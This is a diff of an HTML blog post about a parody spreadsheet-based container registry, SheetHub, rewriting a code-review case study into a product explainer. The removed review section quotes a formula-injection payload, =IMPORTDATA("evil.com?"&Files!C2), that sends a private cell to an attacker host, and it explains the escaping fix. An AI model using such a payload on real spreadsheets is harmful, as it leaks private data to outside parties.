@@ -4,10 +4,10 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <link rel="icon" type="image/svg+xml" href="logos/sncf.svg">
-<title>A stranger shipped us a container registry inside a spreadsheet — here&#x27;s how the review went — SNCF Blog</title>
-<meta name="description" content="A code-review case study: an external contributor built a container registry storing OCI layers in spreadsheet cells for SheetHub. Three review lenses, two fix rounds, and how it shipped.">
-<meta property="og:title" content="A stranger shipped us a container registry inside a spreadsheet — here&#x27;s how the review went">
-<meta property="og:description" content="A code-review case study: an external contributor built a container registry storing OCI layers in spreadsheet cells for SheetHub. Three review lenses, two fix rounds, and how it shipped.">
+<title>A container registry that lives inside spreadsheet cells — SNCF Blog</title>
+<meta name="description" content="SheetHub&#x27;s new spreadsheet-native container registry: OCI image layers stored as base64 sharded across cells, addressed by sha256, pulled back byte-for-byte. How it works, and its honest limits.">
+<meta property="og:title" content="A container registry that lives inside spreadsheet cells">
+<meta property="og:description" content="SheetHub&#x27;s new spreadsheet-native container registry: OCI image layers stored as base64 sharded across cells, addressed by sha256, pulled back byte-for-byte. How it works, and its honest limits.">
 <meta property="og:image" content="https://sncfoundation.github.io/img/blog/sheethub-registry.png">
 <meta property="og:url" content="https://sncfoundation.github.io/blog-a-container-registry-inside-a-spreadsheet.html">
 <meta property="og:type" content="article">
@@ -56,19 +56,19 @@
 </div></nav>
 <header class="hero"><div class="wrap">
   <p class="kicker">SNCF Blog</p>
-  <h1>A stranger shipped us a container registry inside a spreadsheet — here&#x27;s how the review went</h1>
+  <h1>A container registry that lives inside spreadsheet cells</h1>
   <p class="meta">September 12, 2026 · by Timur Tukaev</p>
 </div></header>
 <div class="wrap">
 <article class="post">
-<p>Most of what I write about the Sheet-Native Computing Foundation, I
-built myself. This one I didn’t. An external contributor showed up,
-unprompted, and implemented one of the more ambitious pieces on our
-roadmap: a <strong>container registry that stores OCI image layers
-inside spreadsheet cells</strong>. This post is the story of getting it
-merged — the review, the decisions, the bugs we caught, and what
-shipped. It’s a small case study in open source actually working, and I
-want to give the contributor their due.</p>
+<p>Here’s a thing you can now do in a spreadsheet: push a real OCI
+container image into it, and pull it back out. Not a link to an image,
+not metadata about an image — the actual layers, stored as base64 across
+cells, addressed by sha256, reassembled byte-for-byte on the way out.
+SheetHub, our GitLab-style forge that runs on a Google Sheet, just grew
+a <strong>container registry</strong>, and the whole thing lives in
+cells.</p>
+<p>This post is a look at how it works and why it’s more than a gag.</p>
 <figure>
 <img src="img/blog/sheethub-registry.png"
 alt="The SheetHub container registry: an image’s layers, sharded into cells" />
@@ -76,163 +76,122 @@ alt="The SheetHub container registry: an image’s layers, sharded into cells" /
 image’s layers, sharded into cells</figcaption>
 </figure>
 <blockquote>
-<p><strong>New here?</strong> SheetHub is our GitLab-style DevOps forge
-that runs on a Google Sheet — repos, issues, merge requests, releases,
-all stored in tabs. It’s part of the <strong>Sheet-Native Computing
-Foundation (SNCF)</strong>, a working parody of the CNCF where the whole
-stack lives in spreadsheets: an orchestrator (<a
+<p><strong>New here?</strong> SheetHub is a DevOps forge — repos,
+issues, merge requests, releases — that stores everything in a Google
+Sheet’s tabs. It’s part of the <strong>Sheet-Native Computing Foundation
+(SNCF)</strong>, a working parody of the CNCF where the whole stack
+lives in spreadsheets: an orchestrator (<a
 href="https://github.com/sncfoundation/sheeternetes">Sheeternetes</a>),
 a container image format (SICF), certification, live demos. <a
 href="https://sncfoundation.github.io">sncfoundation.github.io</a> · <a
 href="https://github.com/sncfoundation">github.com/sncfoundation</a></p>
 </blockquote>
-<h2 id="what-landed">What landed</h2>
-<p>A user going by <strong>prateeekbuilds</strong> — who, notably, had
-already built the original SheetHub — opened a PR adding a Container
-Registry tab to the forge. The idea: push a real OCI image and have its
-layers stored as base64, sharded across discrete cells (≤30,000 chars
-each, to stay under the spreadsheet cell limit), addressed by sha256. A
-CLI (<code>sheethub registry push/pull/view/delete</code>), a web UI
-with image cards and a “shard map,” and the Apps Script control plane to
-back it.</p>
-<p>If you’ve read the <a href="blog-doom-inside-a-spreadsheet.html">SICF
-/ DOOM post</a>, this will sound familiar — it’s the same “an image
-lives in the cells” idea, now built into the forge so you can push and
-pull images without an external registry. Here’s the part I find
-genuinely charming: click “Inspect Shard Map” on any image and it shows
-you exactly which cells the layer lives in.</p>
+<h2 id="what-it-is">What it is</h2>
+<p>A container registry is, stripped of ceremony, a content-addressed
+blob store plus a bit of metadata: image layers keyed by their sha256
+digest, and a manifest that says which layers make up which image.
+Docker Hub keeps those blobs in object storage. This registry keeps them
+in <strong>spreadsheet cells</strong>.</p>
+<p>Two tabs do the work:</p>
+<ul>
+<li><strong><code>Registry</code></strong> — one row per image:
+<code>repo</code>, <code>name</code>, <code>tag</code>,
+<code>digest</code>, <code>size</code>, chunk count, who pushed it,
+timestamps. The metadata.</li>
+<li><strong><code>RegistryChunks</code></strong> — the layer bytes
+themselves. Each layer is base64-encoded and sliced into chunks of
+≤30,000 characters, one per cell, each row carrying the layer’s digest
+and its chunk index.</li>
+</ul>
+<p>Why chunked? Because a spreadsheet cell has a hard character limit —
+32,767 in Excel, 50,000 in Google Sheets — and a real layer is far
+bigger than one cell can hold. So the layer is <em>sharded</em> across a
+contiguous run of cells and stitched back together on read. The digest
+is computed over the reassembled bytes, so a single corrupted cell fails
+the sha256 check instead of silently handing you a broken image.</p>
+<p>That’s the whole trick, and it’s the same principle as OCI — content
+addressing by sha256 — with the least appropriate storage medium
+imaginable.</p>
+<h2 id="seeing-the-bytes">Seeing the bytes</h2>
+<p>The part I like most is that the storage isn’t hidden. Every registry
+is just cells you can open and look at, and the UI leans into that.
+Click <strong>Inspect Shard Map</strong> on any image and it shows you
+the exact cells the layer occupies:</p>
 <figure>
 <img src="img/blog/sheethub-shardmap.png"
 alt="The shard breakdown: this layer lives in cells D2 and D3 of the RegistryChunks tab" />
 <figcaption aria-hidden="true">The shard breakdown: this layer lives in
 cells D2 and D3 of the RegistryChunks tab</figcaption>
 </figure>
-<p>That’s a real container image — <code>traefik/whoami</code> — sitting
-in cells <code>D2</code> and <code>D3</code>, sha256-addressed, with a
-byte-for-byte reassembly on pull. It works. But “it works” was the start
-of the conversation, not the end.</p>
-<h2 id="how-we-reviewed-it">How we reviewed it</h2>
-<p>A 1,200-line PR touching the control plane, a CLI, and a web UI is
-exactly the kind of thing where a single skim misses the bug that
-matters. So instead of eyeballing it, I ran the review as <strong>three
-independent passes, each with one lens</strong>: correctness, security,
-and design-fit. Different questions, no shared assumptions.</p>
-<ul>
-<li><strong>Correctness</strong> asked: does the base64 sharding
-round-trip losslessly? Off-by-one at chunk boundaries? Is the sha256
-computed over the right bytes and actually verified on pull?</li>
-<li><strong>Security</strong> asked: can a crafted image name inject a
-live formula into the sheet (<code>=IMPORTDATA(…)</code> runs as the
-sheet owner)? Is the destructive <code>delete_image</code> reachable by
-anyone with the URL? Can a client store content under a digest that
-doesn’t match?</li>
-<li><strong>Design</strong> asked the uncomfortable one: <strong>this
-reinvents a standard we already own.</strong> SNCF already has SICF —
-image layers in <code>Images</code>/<code>Layers</code> tabs,
-sha256-addressed, with a <code>sheetbuild</code> tool that round-trips
-OCI images. The PR built a parallel, incompatible schema
-(<code>Registry</code>/<code>RegistryChunks</code>). Nicely done, but it
-meant a SheetHub image couldn’t be pulled by Sheeternetes’ runtime.</li>
-</ul>
-<p>That structure paid off. Each lens found things the others didn’t —
-the security pass caught the formula-injection vector, correctness
-caught a delete that would wipe layers shared by another image, and the
-design pass surfaced the SICF divergence that no amount of line-by-line
-reading would flag as a “bug.”</p>
-<figure>
-<img src="img/blog/sheethub-timeline.png"
-alt="How the PR got merged: an external contributor, three review lenses, two fix rounds" />
-<figcaption aria-hidden="true">How the PR got merged: an external
-contributor, three review lenses, two fix rounds</figcaption>
-</figure>
-<h2 id="the-back-and-forth">The back-and-forth</h2>
-<p>Here’s where it became a good collaboration rather than a gate. I
-posted the findings; prateeekbuilds turned them around <strong>the same
-day</strong>. Then I re-reviewed — verifying each claimed fix was
-actually implemented, not just described — and found more. He fixed
-those too. The test suite grew from 32 to 50 assertions along the way,
-and CI stayed green.</p>
-<p>A few of the decisions, because they’re the interesting part:</p>
-<p><strong>Formula/CSV injection.</strong> Spreadsheet cells treat a
-leading <code>=</code>, <code>+</code>, <code>-</code>, or
-<code>@</code> as a formula. Since the web app runs as the sheet owner,
-an image named <code>=IMPORTDATA("evil.com?"&amp;Files!C2)</code> would
-exfiltrate a private cell. The fix: prefix-escape those cells with an
-apostrophe on write, unescape on read. The subtle worry — does that
-corrupt base64 chunks that legitimately start with <code>+</code>? We
-tested it explicitly: a <code>+</code>-leading chunk round-trips
-byte-identical, so sha256 still verifies. Safe.</p>
-<p><strong>A delete that ate other images’ data.</strong> Because layers
-are content-addressed by digest, two image tags can share one chunk set.
-The original <code>delete_image</code> removed all chunks for a digest
-unconditionally — so deleting one tag would silently corrupt another.
-The fix mirrors the guard the push path already had: only purge chunks
-when the <em>last</em> image referencing that digest is gone.</p>
-<p><strong>The standard question.</strong> On the SICF divergence,
-prateeekbuilds didn’t get defensive — he agreed, and proposed the right
-shape: adopt SICF’s core columns
-(<code>ordinal</code>/<code>data</code>/<code>media_type</code>, config
-+ ordered layers) while keeping the forge’s own fields
-(<code>repo</code>, <code>tag</code>, <code>author</code>) as an
-additive superset. That makes SheetHub a <em>SICF-native</em> registry —
-its images become pullable by <code>sheetbuild</code> and the
-Sheeternetes runtime — rather than a second, incompatible format. We
-agreed to land the registry now and do the SICF alignment as a focused
-follow-up.</p>
-<h2 id="finishing-the-last-mile-myself">Finishing the last mile
-myself</h2>
-<p>On the second re-review, three residual bugs were left, and they were
-small enough that it was faster to just fix them than to run another
-round-trip. So I pushed a commit onto the branch:</p>
-<ul>
-<li><strong>The demo was broken out of the box.</strong> The backend
-recomputed the seeded images’ digests correctly, but the web UI still
-hardcoded the old ones — one of them was literally the sha256 of the
-empty string. So “Download Layer” on the seeded image aborted with a
-false “integrity error.” I set the UI digests to the hash of their own
-chunks and added a regression test asserting the two can never drift
-again.</li>
-<li><strong>The 50 MB size cap trusted the client</strong> — it only
-fired if the client sent a <code>size_bytes</code> field, so omitting it
-bypassed the cap. Now the server measures the payload itself.</li>
-<li><strong><code>delete_image</code> by digest wasn’t scoped to the
-repo</strong>, so a digest delete could remove a same-digest image in a
-different repo. Scoped it.</li>
-</ul>
-<p>Tests went 50 → 52, CI green, and I approved and squash-merged. I
-left two things as follow-ups rather than block on them: a narrow
-escape-roundtrip edge case for human-authored text starting with
-<code>'</code>, and the fact that the injection guard protects the sheet
-grid but not a downstream CSV export of the JSON API. Both are real,
-neither is worth holding a working feature hostage.</p>
+<p>That’s <code>traefik/whoami</code> — a real image — living in cells
+<code>D2</code> and <code>D3</code> of the <code>RegistryChunks</code>
+tab, 49,152 bytes across two chunks, each comfortably under the cell
+cap, each showing its base64 preview. There’s no abstraction between
+“the registry” and “the spreadsheet.” The registry <em>is</em> the
+spreadsheet, and you can point at the cell a byte lives in.</p>
+<h2 id="pushing-and-pulling">Pushing and pulling</h2>
+<p>It behaves like a registry should. There’s a CLI:</p>
+<pre class="bash"><code>sheethub registry push  sncf/hello-web  traefik/whoami:latest  layer.tar
+sheethub registry pull  sncf/hello-web  traefik/whoami:latest  out.tar
+sheethub registry view  sncf/hello-web  traefik/whoami:latest
+sheethub registry list  sncf/hello-web</code></pre>
+<p><code>push</code> base64-encodes the layer, computes its sha256,
+shards it across cells, and writes the manifest row. <code>pull</code>
+reads the chunks back in order, joins them, <strong>recomputes the
+digest and verifies it</strong>, and decodes the binary layer. The
+digest is authoritative and server-computed, so you can’t store content
+under a digest that doesn’t match its bytes. Same guarantee a real
+registry gives you, enforced by the same hash.</p>
+<p>And because the whole store is a single spreadsheet, this is a
+genuinely <strong>air-gapped, self-hostable registry</strong>: no object
+storage, no Harbor, no external service. One sheet is both the forge and
+the image store. For the small images this is actually good for — static
+binaries, <code>scratch</code>/<code>alpine</code>, WASM modules —
+that’s a real property, not just a punchline.</p>
+<h2 id="the-honest-limits">The honest limits</h2>
+<p>It would be dishonest to skip these, and we <a
+href="blog-we-load-tested-a-spreadsheet-vs-kubernetes.html">load-tested
+them</a> already: a spreadsheet registry is for <strong>small</strong>
+images. The cell cap forces the sharding; the workbook’s 10-million-cell
+ceiling and the Sheets API write quota (~60 writes/min/user) bound how
+much you can push and how fast. A multi-hundred-megabyte image
+technically fits but makes the file heavy and the pushes slow. This is a
+registry for the things that <em>belong</em> in cells, not a Docker Hub
+replacement — and it knows it.</p>
+<p>There’s also a nice detail we verified while shipping this: a base64
+chunk can legitimately begin with a <code>+</code>, which a spreadsheet
+would try to read as a formula. The registry escapes those cells so the
+sheet doesn’t execute them, and the escape round-trips byte-identical —
+so the sha256 still verifies. Content addressing keeps everyone honest,
+including the storage layer.</p>
+<h2 id="where-it-fits">Where it fits</h2>
+<p>The bigger picture: SNCF already stores images in cells via
+<strong>SICF</strong> (our Sheet-Native Image Container Format), and
+Sheeternetes can schedule and run a <code>sicf:</code> image straight
+from a sheet. This registry is the forge-facing front door to that same
+idea — push through SheetHub, and the plan is to make those images
+pullable by <code>sheetbuild</code> and the Sheeternetes runtime
+directly, so a forge and a cluster share one on-sheet image store. That
+alignment is the next step.</p>
 <figure>
 <img src="img/blog/sheethub-forge.png"
 alt="SheetHub, the forge, with the new Container Registry tab" />
 <figcaption aria-hidden="true">SheetHub, the forge, with the new
 Container Registry tab</figcaption>
 </figure>
-<h2 id="why-im-writing-this-up">Why I’m writing this up</h2>
-<p>Two reasons. First, credit: <strong>prateeekbuilds</strong> built the
-original forge <em>and</em> this registry, took a thorough (occasionally
-brutal) review with total grace, and turned fixes around in hours.
-That’s the whole promise of open source, and it’s rare enough that it
-deserves saying out loud. Thank you.</p>
-<p>Second, the review itself is the reusable part. Three independent
-lenses beat one careful read — not because any single reviewer is
-smarter, but because forcing yourself to ask <em>only</em> “is this
-correct,” then <em>only</em> “is this exploitable,” then <em>only</em>
-“does this fit the system,” stops you from smearing all three into a
-vague “looks good.” The design lens in particular — “are we reinventing
-something we own?” — is the one that never shows up as a failing test,
-and it was the most important finding in the whole PR.</p>
-<p>The registry ships. The SICF alignment is next, and prateeekbuilds is
-doing it. Do not run a production registry on a spreadsheet. Do read the
-shard map — it’s a genuinely nice way to see content-addressed storage
-with your own eyes.</p>
+<p>The registry shipped as an external contribution from
+<strong>prateeekbuilds</strong> (who also built SheetHub itself) — a
+genuinely impressive piece of work, 50-plus tests and all. Thank
+you.</p>
+<p>Do not run a production registry on a spreadsheet. Do open the shard
+map — it’s the clearest look at content-addressed storage you’ll get,
+because you can point at the cell.</p>
 <h2 id="join-in">Join in</h2>
 <ul>
 <li>SheetHub: <a
 href="https://github.com/sncfoundation/sheethub">github.com/sncfoundation/sheethub</a></li>
+<li>The container standard (SICF): <a
+href="https://github.com/sncfoundation/sci">github.com/sncfoundation/sci</a></li>
 <li>The foundation: <a
 href="https://sncfoundation.github.io">sncfoundation.github.io</a> · <a
 href="https://github.com/sncfoundation">github.com/sncfoundation</a></li>
